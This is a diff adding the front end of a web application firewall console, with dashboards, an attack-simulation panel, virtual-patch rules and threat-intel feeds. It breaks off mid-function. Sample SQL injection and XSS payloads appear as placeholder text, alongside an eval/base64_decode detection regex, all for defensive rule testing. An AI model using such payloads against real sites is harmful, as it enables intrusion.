@@ -1,0 +1,1202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GCS-WAF — Security Console</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
+<style>
+/* ── DESIGN: Industrial terminal / tactical ops center ──────────────────── */
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap');
+
+:root {
+  --bg:       #080c0f;
+  --bg2:      #0d1318;
+  --bg3:      #111921;
+  --border:   #1e2d3a;
+  --border2:  #2a3f50;
+  --green:    #00e5a0;
+  --green2:   #00b87c;
+  --red:      #ff3d5a;
+  --amber:    #ffaa00;
+  --blue:     #00aaff;
+  --dim:      #3a5266;
+  --text:     #c8dae8;
+  --text2:    #6a8a9e;
+  --font-mono: 'JetBrains Mono', monospace;
+  --font-sans: 'Syne', sans-serif;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: var(--font-mono);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* scanline effect */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px,
+              rgba(0,229,160,.012) 2px, rgba(0,229,160,.012) 4px);
+  pointer-events: none; z-index: 9999;
+}
+
+/* ── HEADER ─────────────────────────────────────────────────────────────── */
+.header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 16px 32px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg2);
+  position: sticky; top: 0; z-index: 100;
+}
+.logo {
+  font-family: var(--font-sans);
+  font-size: 20px; font-weight: 800;
+  letter-spacing: 2px;
+  color: var(--green);
+}
+.logo span { color: var(--text2); font-weight: 400; }
+.header-status {
+  display: flex; align-items: center; gap: 24px;
+  font-size: 11px; color: var(--text2);
+}
+.status-pill {
+  display: flex; align-items: center; gap: 6px;
+  padding: 4px 12px; border-radius: 2px;
+  border: 1px solid var(--border2);
+  background: rgba(0,229,160,.05);
+  color: var(--green); font-size: 11px;
+}
+.pulse {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--green);
+  animation: pulse 2s ease infinite;
+}
+@keyframes pulse {
+  0%,100% { opacity: 1; transform: scale(1); }
+  50%      { opacity: .4; transform: scale(.8); }
+}
+
+/* ── NAV TABS ──────────────────────────────────────────────────────────── */
+.tabs {
+  display: flex; gap: 0;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg2);
+  padding: 0 32px;
+  overflow-x: auto;
+}
+.tab {
+  padding: 12px 20px; cursor: pointer;
+  font-size: 11px; letter-spacing: 1.5px; text-transform: uppercase;
+  color: var(--text2); border-bottom: 2px solid transparent;
+  transition: all .2s; white-space: nowrap;
+  background: none; border-top: none; border-left: none; border-right: none;
+  font-family: var(--font-mono);
+}
+.tab:hover   { color: var(--text); }
+.tab.active  { color: var(--green); border-bottom-color: var(--green); }
+
+/* ── MAIN LAYOUT ────────────────────────────────────────────────────────── */
+.main { padding: 24px 32px; max-width: 1600px; margin: 0 auto; }
+
+/* ── STAT CARDS ─────────────────────────────────────────────────────────── */
+.stat-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 12px; margin-bottom: 24px;
+}
+.stat-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  padding: 20px 24px;
+  position: relative; overflow: hidden;
+}
+.stat-card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 2px;
+}
+.stat-card.red::before   { background: var(--red);   }
+.stat-card.green::before { background: var(--green);  }
+.stat-card.amber::before { background: var(--amber);  }
+.stat-card.blue::before  { background: var(--blue);   }
+
+.stat-label {
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--text2); margin-bottom: 8px;
+}
+.stat-value {
+  font-family: var(--font-sans);
+  font-size: 36px; font-weight: 800;
+  line-height: 1;
+}
+.stat-value.red   { color: var(--red);   }
+.stat-value.green { color: var(--green); }
+.stat-value.amber { color: var(--amber); }
+.stat-value.blue  { color: var(--blue);  }
+.stat-sub { font-size: 10px; color: var(--text2); margin-top: 6px; }
+
+/* ── PANELS ──────────────────────────────────────────────────────────────── */
+.panel {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  margin-bottom: 16px;
+}
+.panel-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border);
+  font-size: 11px; letter-spacing: 1.5px; text-transform: uppercase;
+  color: var(--text2);
+}
+.panel-header .title { color: var(--text); font-weight: 500; }
+.panel-body { padding: 20px; }
+
+/* ── CHART GRID ─────────────────────────────────────────────────────────── */
+.chart-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px; margin-bottom: 16px;
+}
+@media (max-width: 900px) { .chart-grid { grid-template-columns: 1fr; } }
+
+.chart-wrap { position: relative; height: 240px; }
+
+/* ── HEATMAP ─────────────────────────────────────────────────────────────── */
+.heatmap-grid {
+  display: grid;
+  grid-template-columns: repeat(24, 1fr);
+  gap: 3px;
+}
+.heatmap-cell {
+  aspect-ratio: 1;
+  border-radius: 2px;
+  background: var(--bg3);
+  transition: background .3s;
+  cursor: pointer;
+  position: relative;
+}
+.heatmap-cell:hover::after {
+  content: attr(data-tip);
+  position: absolute; bottom: 110%; left: 50%;
+  transform: translateX(-50%);
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  padding: 4px 8px; font-size: 10px; white-space: nowrap;
+  color: var(--text); z-index: 10; pointer-events: none;
+}
+.heatmap-legend {
+  display: flex; align-items: center; gap: 8px;
+  margin-top: 10px; font-size: 10px; color: var(--text2);
+}
+.heatmap-legend-bar {
+  display: flex; gap: 2px;
+}
+.heatmap-legend-bar span {
+  width: 16px; height: 8px; border-radius: 1px; display: inline-block;
+}
+
+/* ── LOG TABLE ───────────────────────────────────────────────────────────── */
+.log-table { width: 100%; border-collapse: collapse; font-size: 11px; }
+.log-table th {
+  text-align: left; padding: 8px 12px;
+  border-bottom: 1px solid var(--border);
+  color: var(--text2); font-weight: 400; letter-spacing: 1px; text-transform: uppercase;
+  background: var(--bg3);
+}
+.log-table td { padding: 7px 12px; border-bottom: 1px solid rgba(30,45,58,.5); }
+.log-table tr:hover td { background: rgba(255,255,255,.02); }
+.badge {
+  padding: 2px 8px; border-radius: 2px; font-size: 10px;
+  letter-spacing: 1px; text-transform: uppercase; font-weight: 500;
+}
+.badge.block  { background: rgba(255,61,90,.15);  color: var(--red);   border: 1px solid rgba(255,61,90,.3); }
+.badge.allow  { background: rgba(0,229,160,.1);   color: var(--green); border: 1px solid rgba(0,229,160,.2); }
+.badge.bot    { background: rgba(255,170,0,.1);   color: var(--amber); border: 1px solid rgba(255,170,0,.2); }
+.rule-tag     { color: var(--amber); font-size: 10px; }
+.country-flag { font-size: 13px; }
+
+/* ── SIMULATION PANEL ───────────────────────────────────────────────────── */
+.sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+@media (max-width: 800px) { .sim-grid { grid-template-columns: 1fr; } }
+
+.sim-input {
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  color: var(--text); font-family: var(--font-mono); font-size: 12px;
+  padding: 12px 14px; width: 100%; resize: vertical;
+  outline: none; transition: border-color .2s;
+}
+.sim-input:focus { border-color: var(--green); }
+
+.btn {
+  padding: 10px 24px; cursor: pointer;
+  font-family: var(--font-mono); font-size: 12px; letter-spacing: 1px;
+  text-transform: uppercase; border: 1px solid; transition: all .2s;
+  background: none;
+}
+.btn.primary {
+  border-color: var(--green); color: var(--green);
+}
+.btn.primary:hover {
+  background: var(--green); color: var(--bg); font-weight: 700;
+}
+.btn.danger  { border-color: var(--red); color: var(--red); }
+.btn.danger:hover { background: var(--red); color: #fff; }
+.btn.amber   { border-color: var(--amber); color: var(--amber); }
+.btn.amber:hover { background: var(--amber); color: var(--bg); }
+
+.attack-presets { display: flex; flex-wrap: wrap; gap: 8px; margin: 12px 0; }
+.preset-btn {
+  padding: 5px 12px; cursor: pointer; font-size: 10px;
+  border: 1px solid var(--border2); color: var(--text2);
+  background: var(--bg3); font-family: var(--font-mono);
+  letter-spacing: .5px; transition: all .2s;
+}
+.preset-btn:hover { border-color: var(--amber); color: var(--amber); }
+
+.sim-result {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  padding: 16px; min-height: 200px; font-size: 11px;
+  position: relative;
+}
+.sim-verdict {
+  font-family: var(--font-sans);
+  font-size: 28px; font-weight: 800;
+  margin-bottom: 12px;
+}
+.sim-verdict.block { color: var(--red);   }
+.sim-verdict.allow { color: var(--green); }
+.sim-detail { color: var(--text2); margin: 4px 0; }
+.sim-rules  { margin-top: 12px; }
+.sim-rule   { display: flex; align-items: center; gap: 8px; margin: 4px 0; }
+.sim-rule-score {
+  width: 36px; text-align: right; color: var(--red); font-weight: 700;
+}
+.sim-rule-name { color: var(--amber); }
+
+/* ── VPATCH PANEL ───────────────────────────────────────────────────────── */
+.vpatch-form {
+  display: grid;
+  grid-template-columns: 1fr auto auto;
+  gap: 10px; align-items: start;
+  margin-bottom: 16px;
+}
+@media (max-width: 700px) { .vpatch-form { grid-template-columns: 1fr; } }
+
+.vpatch-list { display: flex; flex-direction: column; gap: 8px; }
+.vpatch-item {
+  display: flex; align-items: center; justify-content: space-between;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  padding: 12px 16px; gap: 16px;
+}
+.vpatch-item.disabled { opacity: .5; }
+.vpatch-pattern { color: var(--amber); font-size: 12px; flex: 1; }
+.vpatch-meta    { font-size: 10px; color: var(--text2); white-space: nowrap; }
+.vpatch-hits    { color: var(--red); }
+.vpatch-actions { display: flex; gap: 6px; }
+
+/* ── ML STATS ───────────────────────────────────────────────────────────── */
+.ml-grid {
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+  gap: 10px;
+}
+.ml-feature {
+  background: var(--bg3); border: 1px solid var(--border);
+  padding: 12px 14px;
+}
+.ml-feature-name { font-size: 9px; letter-spacing: 1px; text-transform: uppercase; color: var(--text2); }
+.ml-feature-mean { font-size: 20px; font-weight: 700; color: var(--blue); margin: 4px 0; }
+.ml-feature-std  { font-size: 10px; color: var(--text2); }
+
+/* ── SELECT ─────────────────────────────────────────────────────────────── */
+.select {
+  background: var(--bg3); border: 1px solid var(--border2);
+  color: var(--text); font-family: var(--font-mono); font-size: 11px;
+  padding: 8px 10px; outline: none;
+}
+
+/* ── MISC ────────────────────────────────────────────────────────────────── */
+.tag-list { display: flex; flex-wrap: wrap; gap: 6px; }
+.tag {
+  padding: 3px 10px; border-radius: 2px; font-size: 10px;
+  border: 1px solid var(--border2); color: var(--text2);
+}
+.empty { text-align: center; padding: 40px; color: var(--dim); font-size: 12px; }
+.mono  { font-family: var(--font-mono); }
+.green-text { color: var(--green); }
+.red-text   { color: var(--red); }
+.amber-text { color: var(--amber); }
+.loading    { color: var(--text2); animation: blink 1s step-start infinite; }
+@keyframes blink { 50% { opacity: 0; } }
+.section { display: none; }
+.section.active { display: block; }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="header">
+  <div class="logo">GCS-WAF <span>/ Security Console</span></div>
+  <div class="header-status">
+    <div class="status-pill"><div class="pulse"></div><span id="waf-status">ACTIVE</span></div>
+    <span id="header-clock" style="letter-spacing:1px">--:--:--</span>
+    <span id="header-blocked" style="color:var(--red)">-- blocked</span>
+  </div>
+</header>
+
+<!-- TABS -->
+<nav class="tabs">
+  <button class="tab active" onclick="showTab('overview')">Overview</button>
+  <button class="tab" onclick="showTab('heatmap')">Heatmaps</button>
+  <button class="tab" onclick="showTab('simulate')">Attack Simulation</button>
+  <button class="tab" onclick="showTab('vpatch')">Virtual Patches</button>
+  <button class="tab" onclick="showTab('logs')">Live Logs</button>
+  <button class="tab" onclick="showTab('ml')">ML Model</button>
+  <button class="tab" onclick="showTab('intel')">Threat Intel</button>
+</nav>
+
+<!-- MAIN -->
+<main class="main">
+
+  <!-- ── OVERVIEW ────────────────────────────────────────────────────────── -->
+  <section id="overview" class="section active">
+    <!-- stat cards -->
+    <div class="stat-grid">
+      <div class="stat-card red">
+        <div class="stat-label">Total Blocked</div>
+        <div class="stat-value red" id="s-blocked">—</div>
+        <div class="stat-sub" id="s-blocked-rate">requests/min: —</div>
+      </div>
+      <div class="stat-card green">
+        <div class="stat-label">Total Allowed</div>
+        <div class="stat-value green" id="s-allowed">—</div>
+        <div class="stat-sub" id="s-block-pct">block rate: —</div>
+      </div>
+      <div class="stat-card amber">
+        <div class="stat-label">Bot Blocked</div>
+        <div class="stat-value amber" id="s-bot">—</div>
+        <div class="stat-sub">JS challenge failures</div>
+      </div>
+      <div class="stat-card blue">
+        <div class="stat-label">Attack Types</div>
+        <div class="stat-value blue" id="s-types">—</div>
+        <div class="stat-sub">distinct categories</div>
+      </div>
+    </div>
+
+    <!-- charts -->
+    <div class="chart-grid">
+      <div class="panel">
+        <div class="panel-header"><span class="title">Attack Types Distribution</span></div>
+        <div class="panel-body"><div class="chart-wrap"><canvas id="chartTypes"></canvas></div></div>
+      </div>
+      <div class="panel">
+        <div class="panel-header"><span class="title">Requests Over Time (last 60s)</span></div>
+        <div class="panel-body"><div class="chart-wrap"><canvas id="chartTimeline"></canvas></div></div>
+      </div>
+    </div>
+
+    <!-- top attacks panel -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">Recent Blocked Requests</span>
+        <span id="last-update" style="font-size:10px">refreshing...</span>
+      </div>
+      <div class="panel-body" style="padding:0">
+        <table class="log-table">
+          <thead>
+            <tr>
+              <th>Time</th><th>IP</th><th>Country</th>
+              <th>Rule Triggered</th><th>Score</th><th>URI</th><th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="overview-log-body">
+            <tr><td colspan="7" class="empty loading">Loading...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── HEATMAPS ────────────────────────────────────────────────────────── -->
+  <section id="heatmap" class="section">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">Attack Frequency Heatmap — Hour × Day of Week</span>
+        <span style="font-size:10px;color:var(--text2)">darker = more attacks</span>
+      </div>
+      <div class="panel-body">
+        <div style="margin-bottom:8px;font-size:10px;color:var(--text2);letter-spacing:1px">
+          HOURS (0–23) →
+        </div>
+        <div class="heatmap-grid" id="heatmap-hourly"></div>
+        <div class="heatmap-legend">
+          <span>Low</span>
+          <div class="heatmap-legend-bar" id="heatmap-legend"></div>
+          <span>High</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="chart-grid">
+      <div class="panel">
+        <div class="panel-header"><span class="title">Attacks by Country</span></div>
+        <div class="panel-body"><div class="chart-wrap"><canvas id="chartGeo"></canvas></div></div>
+      </div>
+      <div class="panel">
+        <div class="panel-header"><span class="title">Attack Score Distribution</span></div>
+        <div class="panel-body"><div class="chart-wrap"><canvas id="chartScore"></canvas></div></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header"><span class="title">Top Attacking IPs</span></div>
+      <div class="panel-body" style="padding:0">
+        <table class="log-table">
+          <thead><tr><th>IP Address</th><th>Requests</th><th>Blocked</th><th>Behavior Score</th><th>Country</th><th>Last Seen</th></tr></thead>
+          <tbody id="top-ips-body">
+            <tr><td colspan="6" class="empty">No data</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── ATTACK SIMULATION ────────────────────────────────────────────────── -->
+  <section id="simulate" class="section">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">Attack Simulation Panel</span>
+        <span style="font-size:10px;color:var(--amber)">⚠ Tests your WAF rules in real-time</span>
+      </div>
+      <div class="panel-body">
+        <div class="attack-presets">
+          <button class="preset-btn" onclick="loadPreset('sqli1')">SQLi Basic</button>
+          <button class="preset-btn" onclick="loadPreset('sqli2')">SQLi UNION</button>
+          <button class="preset-btn" onclick="loadPreset('xss1')">XSS Script Tag</button>
+          <button class="preset-btn" onclick="loadPreset('xss2')">XSS Event Handler</button>
+          <button class="preset-btn" onclick="loadPreset('path1')">Path Traversal</button>
+          <button class="preset-btn" onclick="loadPreset('cmdi1')">Command Injection</button>
+          <button class="preset-btn" onclick="loadPreset('ssrf1')">SSRF</button>
+          <button class="preset-btn" onclick="loadPreset('rfi1')">RFI</button>
+          <button class="preset-btn" onclick="loadPreset('safe')">Safe Request</button>
+        </div>
+
+        <div class="sim-grid">
+          <div>
+            <div style="font-size:10px;color:var(--text2);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">
+              Payload to test
+            </div>
+            <textarea id="sim-payload" class="sim-input" rows="8"
+              placeholder="Enter attack payload here...&#10;e.g. /?id=1' OR '1'='1&#10;or: &lt;script&gt;alert(1)&lt;/script&gt;"></textarea>
+            <div style="margin-top:10px;display:flex;gap:10px;align-items:center">
+              <button class="btn primary" onclick="runSimulation()">▶ Run Test</button>
+              <button class="btn amber"   onclick="runAllPresets()">▶ Run All Presets</button>
+              <span id="sim-loading" style="display:none;color:var(--text2);font-size:11px" class="loading">Testing...</span>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text2);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">
+              WAF Decision
+            </div>
+            <div class="sim-result" id="sim-result">
+              <div class="empty" style="margin-top:40px">Run a test to see the WAF decision</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Batch test results -->
+        <div id="batch-results" style="display:none;margin-top:20px">
+          <div class="panel-header" style="padding:12px 0;border-top:1px solid var(--border);border-bottom:none;margin-top:16px">
+            <span class="title">Batch Test Results</span>
+            <span id="batch-summary" style="font-size:11px"></span>
+          </div>
+          <table class="log-table" style="margin-top:10px">
+            <thead><tr><th>Payload</th><th>Category</th><th>Score</th><th>Decision</th></tr></thead>
+            <tbody id="batch-body"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── VIRTUAL PATCHES ──────────────────────────────────────────────────── -->
+  <section id="vpatch" class="section">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">Virtual Patching — Live Rule Deployment</span>
+        <span style="font-size:10px;color:var(--text2)">rules activate instantly, no restart needed</span>
+      </div>
+      <div class="panel-body">
+        <div class="vpatch-form">
+          <div>
+            <div style="font-size:10px;color:var(--text2);letter-spacing:1px;margin-bottom:6px">PATTERN (regex)</div>
+            <input id="vp-pattern" class="sim-input" style="resize:none;height:40px"
+              placeholder="e.g. (?i)eval\s*\(|base64_decode\s*\(">
+          </div>
+          <div>
+            <div style="font-size:10px;color:var(--text2);letter-spacing:1px;margin-bottom:6px">TARGET</div>
+            <select id="vp-target" class="select" style="height:40px">
+              <option value="any">Any</option>
+              <option value="uri">URI</option>
+              <option value="body">Body</option>
+              <option value="args">Args</option>
+            </select>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div style="font-size:10px;color:transparent">DEPLOY</div>
+            <button class="btn primary" onclick="addPatch()" style="height:40px">+ Deploy Patch</button>
+          </div>
+        </div>
+        <div style="margin-bottom:12px">
+          <input id="vp-desc" class="sim-input" style="resize:none;height:36px;font-size:11px"
+            placeholder="Description (optional) — e.g. Block CVE-2024-XXXX PHP eval injection">
+        </div>
+
+        <div id="vpatch-list" class="vpatch-list">
+          <div class="empty loading">Loading patches...</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── LIVE LOGS ───────────────────────────────────────────────────────── -->
+  <section id="logs" class="section">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">Live Access Log</span>
+        <div style="display:flex;gap:10px;align-items:center">
+          <label style="font-size:10px;color:var(--text2);display:flex;align-items:center;gap:6px;cursor:pointer">
+            <input type="checkbox" id="filter-blocked-only" checked onchange="renderLogs()">
+            Blocked only
+          </label>
+          <select class="select" id="filter-type" onchange="renderLogs()" style="font-size:10px;padding:4px 8px">
+            <option value="all">All types</option>
+            <option value="sqli">SQLi</option>
+            <option value="xss">XSS</option>
+            <option value="path_traversal">Path Traversal</option>
+            <option value="cmdi">CMDi</option>
+            <option value="ssrf">SSRF</option>
+          </select>
+          <span id="log-count" style="font-size:10px;color:var(--text2)">0 entries</span>
+        </div>
+      </div>
+      <div class="panel-body" style="padding:0;max-height:500px;overflow-y:auto">
+        <table class="log-table">
+          <thead>
+            <tr>
+              <th>Time</th><th>IP</th><th>Method</th><th>URI</th>
+              <th>Rule</th><th>Score</th><th>Country</th><th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="log-body">
+            <tr><td colspan="8" class="empty loading">Waiting for logs...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── ML MODEL ───────────────────────────────────────────────────────── -->
+  <section id="ml" class="section">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">ML Anomaly Detection Model</span>
+        <span id="ml-status" style="font-size:10px;color:var(--text2)">loading...</span>
+      </div>
+      <div class="panel-body">
+        <div style="margin-bottom:20px">
+          <div style="font-size:12px;color:var(--text2);margin-bottom:12px">
+            The model learns normal traffic patterns using Welford's online algorithm (Z-score).
+            Requests deviating more than 4σ from the baseline are flagged as anomalous.
+            Confidence threshold for blocking: <span class="amber-text">0.85</span>.
+            Minimum baseline: <span class="amber-text">100 requests</span>.
+          </div>
+          <div style="display:flex;gap:16px;flex-wrap:wrap">
+            <div class="stat-card blue" style="padding:14px 18px;margin:0">
+              <div class="stat-label">Training Samples</div>
+              <div class="stat-value blue" id="ml-samples" style="font-size:28px">—</div>
+            </div>
+            <div class="stat-card amber" style="padding:14px 18px;margin:0">
+              <div class="stat-label">Features Tracked</div>
+              <div class="stat-value amber" style="font-size:28px">13</div>
+            </div>
+            <div class="stat-card green" style="padding:14px 18px;margin:0">
+              <div class="stat-label">Model Status</div>
+              <div class="stat-value green" id="ml-model-status" style="font-size:18px;padding-top:4px">—</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--text2);margin-bottom:12px">
+          Feature Baselines (μ ± σ)
+        </div>
+        <div class="ml-grid" id="ml-features">
+          <div class="empty loading">Loading model data...</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── THREAT INTEL ────────────────────────────────────────────────────── -->
+  <section id="intel" class="section">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="title">Threat Intelligence Feeds</span>
+        <span style="font-size:10px;color:var(--text2)">auto-refreshes every 1-24h depending on feed</span>
+      </div>
+      <div class="panel-body">
+        <div class="stat-grid" style="grid-template-columns:repeat(4,1fr);margin-bottom:20px">
+          <div class="stat-card green">
+            <div class="stat-label">Spamhaus DROP</div>
+            <div class="stat-value green" style="font-size:24px" id="feed-drop">—</div>
+            <div class="stat-sub">CIDR blocks, 24h TTL</div>
+          </div>
+          <div class="stat-card green">
+            <div class="stat-label">Spamhaus EDROP</div>
+            <div class="stat-value green" style="font-size:24px" id="feed-edrop">—</div>
+            <div class="stat-sub">Extended DROP, 24h TTL</div>
+          </div>
+          <div class="stat-card amber">
+            <div class="stat-label">Emerging Threats</div>
+            <div class="stat-value amber" style="font-size:24px" id="feed-et">—</div>
+            <div class="stat-sub">IP blocklist, 12h TTL</div>
+          </div>
+          <div class="stat-card blue">
+            <div class="stat-label">Tor Exit Nodes</div>
+            <div class="stat-value blue" style="font-size:24px" id="feed-tor">—</div>
+            <div class="stat-sub">Tor exits, 1h TTL</div>
+          </div>
+        </div>
+
+        <div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--text2);margin-bottom:12px">
+          Dynamic Block List
+        </div>
+        <div style="display:flex;gap:10px;margin-bottom:12px">
+          <input id="block-ip-input" class="sim-input" style="resize:none;height:36px;flex:1;font-size:11px"
+            placeholder="IP address to block (e.g. 1.2.3.4)">
+          <input id="block-ttl" class="sim-input" style="resize:none;height:36px;width:100px;font-size:11px"
+            placeholder="TTL (s)" value="3600">
+          <button class="btn danger" onclick="blockIP()" style="height:36px">Block IP</button>
+        </div>
+        <div id="block-list">
+          <div class="empty">No dynamically blocked IPs</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<script>
+// ── CONFIG ────────────────────────────────────────────────────────────────
+const WAF_API   = 'http://localhost/waf-api';
+const REFRESH   = 5000;  // ms
+
+// ── STATE ─────────────────────────────────────────────────────────────────
+let allLogs      = [];
+let statsHistory = [];
+let charts       = {};
+let heatmapData  = {};  // { "hour_day": count }
+
+// ── TAB ROUTING ───────────────────────────────────────────────────────────
+function showTab(name) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById(name).classList.add('active');
+  event.target.classList.add('active');
+  if (name === 'vpatch') loadPatches();
+  if (name === 'ml')     loadMLStats();
+}
+
+// ── CLOCK ─────────────────────────────────────────────────────────────────
+function updateClock() {
+  document.getElementById('header-clock').textContent =
+    new Date().toLocaleTimeString('en-GB', { hour12: false });
+}
+setInterval(updateClock, 1000); updateClock();
+
+// ── API HELPERS ───────────────────────────────────────────────────────────
+async function apiFetch(path, opts) {
+  try {
+    const r = await fetch(path, opts || {});
+    return r.ok ? r.json() : null;
+  } catch { return null; }
+}
+
+// ── CHART INIT ────────────────────────────────────────────────────────────
+const chartCfg = (type, data, opts) => ({
+  type,
+  data,
+  options: {
+    responsive: true, maintainAspectRatio: false,
+    plugins: { legend: { labels: { color: '#6a8a9e', font: { family: "'JetBrains Mono'" } } } },
+    scales: type !== 'doughnut' && type !== 'pie' ? {
+      x: { ticks: { color: '#3a5266', font: { family: "'JetBrains Mono'", size: 10 } },
+           grid:  { color: 'rgba(30,45,58,.6)' } },
+      y: { ticks: { color: '#3a5266', font: { family: "'JetBrains Mono'", size: 10 } },
+           grid:  { color: 'rgba(30,45,58,.6)' } },
+    } : {},
+    ...opts,
+  }
+});
+
+function initCharts() {
+  // Attack types pie
+  charts.types = new Chart(document.getElementById('chartTypes'),
+    chartCfg('doughnut', {
+      labels: ['SQLi', 'XSS', 'Path Traversal', 'CMDi', 'SSRF', 'RFI'],
+      datasets: [{ data: [0,0,0,0,0,0],
+        backgroundColor: ['#ff3d5a','#ffaa00','#00aaff','#ff6644','#cc44ff','#44ddff'],
+        borderWidth: 0 }],
+    }));
+
+  // Timeline line chart
+  charts.timeline = new Chart(document.getElementById('chartTimeline'),
+    chartCfg('line', {
+      labels: [],
+      datasets: [
+        { label: 'Blocked', data: [], borderColor: '#ff3d5a',
+          backgroundColor: 'rgba(255,61,90,.1)', tension: .4, fill: true },
+        { label: 'Allowed', data: [], borderColor: '#00e5a0',
+          backgroundColor: 'rgba(0,229,160,.05)', tension: .4, fill: true },
+      ]
+    }));
+
+  // Geo chart
+  charts.geo = new Chart(document.getElementById('chartGeo'),
+    chartCfg('bar', {
+      labels: [],
+      datasets: [{ label: 'Attacks', data: [],
+        backgroundColor: 'rgba(255,61,90,.7)', borderWidth: 0 }],
+    }));
+
+  // Score distribution
+  charts.score = new Chart(document.getElementById('chartScore'),
+    chartCfg('bar', {
+      labels: ['0-10','11-20','21-30','31-40','41-50','51-70','71-90','91+'],
+      datasets: [{ label: 'Requests', data: Array(8).fill(0),
+        backgroundColor: 'rgba(0,170,255,.6)', borderWidth: 0 }],
+    }));
+}
+
+// ── STATS REFRESH ─────────────────────────────────────────────────────────
+let prevBlocked = 0;
+async function refreshStats() {
+  const data = await apiFetch(WAF_API + '/stats');
+  if (!data) return;
+
+  const { total_blocked: b, total_allowed: a, bot_blocked, attack_types } = data;
+
+  document.getElementById('s-blocked').textContent = b.toLocaleString();
+  document.getElementById('s-allowed').textContent = a.toLocaleString();
+  document.getElementById('s-bot').textContent     = (bot_blocked||0).toLocaleString();
+  document.getElementById('header-blocked').textContent = b.toLocaleString() + ' blocked';
+
+  const total = b + a;
+  const pct   = total > 0 ? ((b/total)*100).toFixed(1) : '0.0';
+  document.getElementById('s-block-pct').textContent  = `block rate: ${pct}%`;
+
+  const types = attack_types || {};
+  const typeCount = Object.values(types).filter(v => v > 0).length;
+  document.getElementById('s-types').textContent = typeCount;
+
+  // Rate calc
+  const rate = b - prevBlocked;
+  prevBlocked = b;
+  document.getElementById('s-blocked-rate').textContent =
+    `+${Math.max(0,rate)} in last ${REFRESH/1000}s`;
+
+  // Update pie chart
+  charts.types.data.datasets[0].data = [
+    types.sqli||0, types.xss||0, types.path_traversal||0,
+    types.cmdi||0, types.ssrf||0, types.rfi||0
+  ];
+  charts.types.update('none');
+
+  // Update timeline
+  const now = new Date().toLocaleTimeString('en-GB', { hour12:false });
+  const tlabels  = charts.timeline.data.labels;
+  const tblocked = charts.timeline.data.datasets[0].data;
+  const tallowed = charts.timeline.data.datasets[1].data;
+
+  tlabels.push(now);
+  tblocked.push(Math.max(0, rate));
+  tallowed.push(0);  // approximate
+  if (tlabels.length > 30) { tlabels.shift(); tblocked.shift(); tallowed.shift(); }
+  charts.timeline.update('none');
+
+  // Feed sizes (rough estimate from stats)
+  document.getElementById('feed-drop').textContent  = data.feed_drop  || '~1.2k';
+  document.getElementById('feed-edrop').textContent = data.feed_edrop || '~220';
+  document.getElementById('feed-et').textContent    = data.feed_et    || '~38k';
+  document.getElementById('feed-tor').textContent   = data.feed_tor   || '~1.8k';
+
+  document.getElementById('last-update').textContent = 'Updated ' + now;
+}
+
+// ── LOG REFRESH ────────────────────────────────────────────────────────────
+async function refreshLogs() {
+  const data = await apiFetch(WAF_API + '/recent');
+  if (!data || !Array.isArray(data)) return;
+
+  allLogs = data.map(entry => {
